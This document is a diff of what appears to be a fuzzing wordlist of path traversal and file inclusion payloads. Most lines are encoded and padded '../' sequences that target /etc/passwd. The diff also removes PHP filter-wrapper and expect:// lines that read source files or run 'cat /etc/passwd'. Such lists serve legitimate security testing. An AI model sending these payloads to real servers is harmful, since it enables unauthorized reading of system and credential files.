@@ -1,12 +1,12 @@
+../../../../../etc/passwd
+../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd
 ..//etc/passwd
 ../..//etc/passwd
 ../../..//etc/passwd
 ../../../..//etc/passwd
-../../../../..//etc/passwd
 ../../../../../..//etc/passwd
 ../../../../../../..//etc/passwd
 ../../../../../../../..//etc/passwd
-../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd
 ../../../etc/passwd%00
 ....//....//etc/passwd
 ..///////..////..//////etc/passwd
@@ -15,13 +15,6 @@
 %252e%252e%252fetc%252fpasswd%00
 %c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
 %c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00
-php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
-pHp://FilTer/convert.base64-encode/resource=index.php
-php://filter/convert.base64-encode/resource=index.php
-php://filter/read=string.rot13/resource=index.php
-expect://cat /etc/passwd
-expect://cat%20/etc/passwd
-expect://cat%20%2Fetc%2Fpasswd
 ..%2f/etc/passwd
 ..%2f..%2f/etc/passwd
 ..%2f..%2f..%2f/etc/passwd
